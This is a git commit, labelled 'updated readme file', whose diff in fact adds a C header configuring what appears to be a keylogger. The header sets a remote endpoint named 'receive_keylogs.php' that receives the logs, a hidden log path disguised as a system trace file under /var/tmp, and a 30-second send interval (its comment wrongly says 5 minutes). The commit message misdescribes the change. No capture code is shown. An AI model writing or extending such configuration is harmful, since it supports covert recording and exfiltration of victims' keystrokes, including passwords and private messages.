c7c3154bbb1c4edff03167d34590113c747a48ea
Sanjay Vijayakumar <email2sanjayv@gmail.com>
2025-06-22 23:19:44 +0530

    updated readme file

---
+++ include/config.h
@@ -0,0 +1,13 @@
+#ifndef CONFIG_H
+#define CONFIG_H
+
+// Remote server endpoint
+#define REMOTE_URL "http://sanjay.com/receive_keylogs.php"
+
+
+
+// Other configurable parameters
+#define LOG_PATH "/var/tmp/.syslog/.ktrace.log"
+#define SEND_INTERVAL_SECONDS (30) // 5 minutes
+
+#endif
